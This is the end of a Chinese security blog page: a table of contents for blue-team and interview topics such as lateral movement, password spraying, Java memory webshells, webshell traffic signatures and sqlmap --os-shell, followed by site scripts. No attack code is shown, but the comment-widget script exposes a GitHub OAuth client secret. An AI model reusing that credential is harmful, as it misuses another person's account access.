toc-level-4"><a class="toc-link" href="#%E7%9B%AE%E7%9A%84%E5%B7%B2%E8%BE%BE%E6%88%90"><span class="toc-number">20.1.3.</span> <span class="toc-text">目的已达成</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%88%A4%E6%96%AD%E8%AF%AF%E6%8A%A5"><span class="toc-number">20.2.</span> <span class="toc-text">判断误报</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%8C%96%E7%9F%BF%E7%97%85%E6%AF%92%E6%8E%92%E6%9F%A5"><span class="toc-number">20.3.</span> <span class="toc-text">挖矿病毒排查</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#Windows%E7%B3%BB%E7%BB%9F"><span class="toc-number">20.3.1.</span> <span class="toc-text">Windows系统</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#Linux%E7%B3%BB%E7%BB%9F"><span class="toc-number">20.3.2.</span> <span class="toc-text">Linux系统</span></a></li></ol></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%BA%AF%E6%BA%90%E6%96%B9%E6%B3%95"><span class="toc-number">21.</span> <span class="toc-text">溯源方法</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%AF%B9%E5%86%85%E6%BA%AF%E6%BA%90"><span class="toc-number">21.1.</span> <span class="toc-text">对内溯源</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%AF%B9%E5%A4%96%E6%BA%AF%E6%BA%90"><span class="toc-number">21.2.</span> <span class="toc-text">对外溯源</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#java%E5%86%85%E5%AD%98%E9%A9%AC"><span class="toc-number">22.</span> <span class="toc-text">java内存马</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#web-xml"><span class="toc-number">22.1.</span> <span class="toc-text">web.xml</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#listener"><span class="toc-number">22.2.</span> <span class="toc-text">listener</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#filter"><span class="toc-number">22.3.</span> <span class="toc-text">filter</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#filter%E7%9A%84%E7%94%9F%E5%91%BD%E5%91%A8%E6%9C%9F"><span class="toc-number">22.4.</span> <span class="toc-text">filter的生命周期</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#filterchains"><span class="toc-number">22.5.</span> <span class="toc-text">filterchains</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#servlet"><span class="toc-number">22.6.</span> <span class="toc-text">servlet</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%85%8D%E6%9D%80%E6%9C%89%E6%97%A0%E7%A0%94%E7%A9%B6"><span class="toc-number">23.</span> <span class="toc-text">免杀有无研究</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%9F%9F%E5%86%85%E6%A8%AA%E5%90%91%E7%A7%BB%E5%8A%A8%E7%9A%84%E6%96%B9%E6%B3%95"><span class="toc-number">24.</span> <span class="toc-text">域内横向移动的方法</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#IPC%E5%85%B1%E4%BA%AB"><span class="toc-number">24.1.</span> <span class="toc-text">IPC共享</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#at-schtasks"><span class="toc-number">24.2.</span> <span class="toc-text">at&#x2F;schtasks</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#pth-ptk-ptt-1"><span class="toc-number">24.3.</span> <span class="toc-text">pth ptk ptt</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#dcom%E7%BB%84%E4%BB%B6"><span class="toc-number">24.4.</span> <span class="toc-text">dcom组件</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#psexec"><span class="toc-number">24.5.</span> <span class="toc-text">psexec</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#wmi"><span class="toc-number">24.6.</span> <span class="toc-text">wmi</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#WinRM"><span class="toc-number">24.7.</span> <span class="toc-text">WinRM</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%9F%9F%E5%86%85%E5%AF%86%E7%A0%81%E5%96%B7%E6%B4%92%E8%84%9A%E6%9C%AC"><span class="toc-number">24.8.</span> <span class="toc-text">域内密码喷洒脚本</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%AA%83%E5%8F%96%E7%AE%A1%E7%90%86%E5%91%98token%E6%A8%AA%E5%90%91"><span class="toc-number">24.9.</span> <span class="toc-text">窃取管理员token横向</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%B5%81%E9%87%8F%E7%89%B9%E5%BE%81-webshell%E5%AE%A2%E6%88%B7%E7%AB%AF%E7%AD%89"><span class="toc-number">25.</span> <span class="toc-text">流量特征 webshell客户端等</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E4%B8%AD%E5%9B%BD%E8%8F%9C%E5%88%80"><span class="toc-number">25.1.</span> <span class="toc-text">中国菜刀</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E4%B8%AD%E5%9B%BD%E8%9A%81%E5%89%91"><span class="toc-number">25.2.</span> <span class="toc-text">中国蚁剑</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%86%B0%E8%9D%8E2-0"><span class="toc-number">25.3.</span> <span class="toc-text">冰蝎2.0</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%86%B0%E8%9D%8E3-0"><span class="toc-number">25.4.</span> <span class="toc-text">冰蝎3.0</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%93%A5%E6%96%AF%E6%8B%89"><span class="toc-number">25.5.</span> <span class="toc-text">哥斯拉</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Webshell%E5%AE%A2%E6%88%B7%E7%AB%AF%E4%BD%BF%E7%94%A8%E4%B8%8A%E7%9A%84%E5%8C%BA%E5%88%AB"><span class="toc-number">26.</span> <span class="toc-text">Webshell客户端使用上的区别</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#sqlmap-%E2%80%93os-shell%E5%8E%9F%E7%90%86"><span class="toc-number">27.</span> <span class="toc-text">sqlmap –os-shell原理</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%8A%A4%E7%BD%91%E5%B0%8F%E4%BD%9C%E6%96%87%E7%B3%BB%E5%88%97%EF%BC%88%E9%9B%BE"><span class="toc-number">28.</span> <span class="toc-text">护网小作文系列（雾</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%BA%AF%E6%BA%90%E7%BB%8F%E5%8E%86"><span class="toc-number">28.1.</span> <span class="toc-text">溯源经历</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%B8%97%E9%80%8F%E8%BF%87%E7%A8%8B"><span class="toc-number">28.2.</span> <span class="toc-text">渗透过程</span></a></li></ol></li></ol></div></div></div></div></main><footer id="footer"><div id="footer-wrap"><div class="copyright">&copy;2017 - 2023 By Y5neKO</div><div class="framework-info"><span>框架 </span><a target="_blank" rel="noopener" href="https://hexo.io">Hexo</a><span class="footer-separator">|</span><span>主题 </span><a target="_blank" rel="noopener" href="https://github.com/jerryc127/hexo-theme-butterfly">Butterfly</a></div><div class="footer_custom_text">行走于黑白之间.</div></div></footer></div><div id="rightside"><div id="rightside-config-hide"><button id="readmode" type="button" title="阅读模式"><i class="fas fa-book-open"></i></button><button id="translateLink" type="button" title="简繁转换">繁</button><button id="darkmode" type="button" title="浅色和深色模式转换"><i class="fas fa-adjust"></i></button><button id="hide-aside-btn" type="button" title="单栏和双栏切换"><i class="fas fa-arrows-alt-h"></i></button></div><div id="rightside-config-show"><button id="rightside-config" type="button" title="设置"><i class="fas fa-cog fa-spin"></i></button><button class="close" id="mobile-toc-button" type="button" title="目录"><i class="fas fa-list-ul"></i></button><a id="to_comment" href="#post-comment" title="直达评论"><i class="fas fa-comments"></i></a><button id="go-up" type="button" title="回到顶部"><span class="scroll-percent"></span><i class="fas fa-arrow-up"></i></button></div></div><div><script src="/js/utils.js"></script><script src="/js/main.js"></script><script src="/js/tw_cn.js"></script><script src="https://cdn.jsdelivr.net/npm/medium-zoom/dist/medium-zoom.min.js"></script><script src="https://cdn.jsdelivr.net/npm/instant.page/instantpage.min.js" type="module"></script><script src="https://cdn.jsdelivr.net/npm/vanilla-lazyload/dist/lazyload.iife.min.js"></script><script src="https://cdn.jsdelivr.net/npm/node-snackbar/dist/snackbar.min.js"></script><script>function panguFn () {
  if (typeof pangu === 'object') pangu.autoSpacingPage()
  else {
    getScript('https://cdn.jsdelivr.net/npm/pangu/dist/browser/pangu.min.js')
      .then(() => {
        pangu.autoSpacingPage()
      })
  }
}

function panguInit () {
  if (false){
    GLOBAL_CONFIG_SITE.isPost && panguFn()
  } else {
    panguFn()
  }
}

document.addEventListener('DOMContentLoaded', panguInit)</script><div class="js-pjax"><script>(() => {
  const initGitalk = () => {
    const gitalk = new Gitalk(Object.assign({
      clientID: '4d2d58bafea4c026b68f',
      clientSecret: '61a3976d66520d7bfd80d2de0e9e60fe31820603',
      repo: 'y5neko.github.io',
      owner: 'Y5neKO',
      admin: ['Y5neKO'],
      id: '0181bf191e81765fbdf11a6b94de9990',
      updateCountCallback: commentCount
    },null))

    gitalk.render('gitalk-container')
  }

  const loadGitalk = async() => {
    if (typeof Gitalk === 'function') initGitalk()
    else {
      await getCSS('https://cdn.jsdelivr.net/npm/gitalk/dist/gitalk.min.css')
      await getScript('https://cdn.jsdelivr.net/npm/gitalk/dist/gitalk.min.js')
      initGitalk()
    }
  }
  
  const commentCount = n => {
    const isCommentCount = document.querySelector('#post-meta .gitalk-comment-count')
    if (isCommentCount) {
      isCommentCount.textContent= n
    }
  }

  if ('Gitalk' === 'Gitalk' || !false) {
    if (false) btf.loadComment(document.getElementById('gitalk-container'), loadGitalk)
    else loadGitalk()
  } else {
    window.loadOtherComment = loadGitalk
  }
})()</script></div><div class="aplayer no-destroy" data-id="2102314888" data-server="netease" data-type="playlist" data-fixed="true" data-autoplay="true" data-mini="true"> </div><canvas class="fireworks" mobile="true"></canvas><script src="https://cdn.jsdelivr.net/npm/butterfly-extsrc/dist/fireworks.min.js"></script><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/aplayer/dist/APlayer.min.css" media="print" onload="this.media='all'"><script src="https://cdn.jsdelivr.net/npm/aplayer/dist/APlayer.min.js"></script><script src="https://cdn.jsdelivr.net/npm/butterfly-extsrc/metingjs/dist/Meting.min.js"></script><script src="https://cdn.jsdelivr.net/npm/pjax/pjax.min.js"></script><script>let pjaxSelectors = ["head > title","#config-diff","#body-wrap","#rightside-config-hide","#rightside-config-show",".js-pjax"]

var pjax = new Pjax({
  elements: 'a:not([target="_blank"])',
  selectors: pjaxSelectors,
  cacheBust: false,
  analytics: false,
  scrollRestoration: false
})

document.addEventListener('pjax:send', function () {

  // removeEventListener
  btf.removeGlobalFnEvent('pjax')
  btf.removeGlobalFnEvent('themeChange')

  document.getElementById('rightside').classList.remove('rightside-show')
  
  if (window.aplayers) {
    for (let i = 0; i < window.aplayers.length; i++) {
      if (!window.aplayers[i].options.fixed) {
        window.aplayers[i].destroy()
      }
    }
  }

  typeof typed === 'object' && typed.destroy()

  //reset readmode
  const $bodyClassList = document.body.classList
  $bodyClassList.contains('read-mode') && $bodyClassList.remove('read-mode')

  typeof disqusjs === 'object' && disqusjs.destroy()
})

document.addEventListener('pjax:complete', function () {
  window.refreshFn()

  document.querySelectorAll('script[data-pjax]').forEach(item => {
    const newScript = document.createElement('script')
    const content = item.text || item.textContent || item.innerHTML || ""
    Array.from(item.attributes).forEach(attr => newScript.setAttribute(attr.name, attr.value))
    newScript.appendChild(document.createTextNode(content))
    item.parentNode.replaceChild(newScript, item)
  })

  GLOBAL_CONFIG.islazyload && window.lazyLoadInstance.update()

  typeof panguInit === 'function' && panguInit()

  // google analytics
  typeof gtag === 'function' && gtag('config', '', {'page_path': window.location.pathname});

  // baidu analytics
  typeof _hmt === 'object' && _hmt.push(['_trackPageview',window.location.pathname]);

  typeof loadMeting === 'function' && document.getElementsByClassName('aplayer').length && loadMeting()

  // prismjs
  typeof Prism === 'object' && Prism.highlightAll()
})

document.addEventListener('pjax:error', e => {
  if (e.request.status === 404) {
    pjax.loadUrl('/404.html')
  }
})</script><script async data-pjax src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script><div id="local-search"><div class="search-dialog"><nav class="search-nav"><span class="search-dialog-title">搜索</span><span id="loading-status"></span><button class="search-close-button"><i class="fas fa-times"></i></button></nav><div class="is-center" id="loading-database"><i class="fas fa-spinner fa-pulse"></i><span>  数据库加载中</span></div><div class="search-wrap"><div id="local-search-input"><div class="local-search-box"><input class="local-search-box--input" placeholder="搜索文章" type="text"/></div></div><hr/><div id="local-search-results"></div><div id="local-search-stats-wrap"></div></div></div><div id="search-mask"></div><script src="/js/search/local-search.js"></script></div></div></body></html>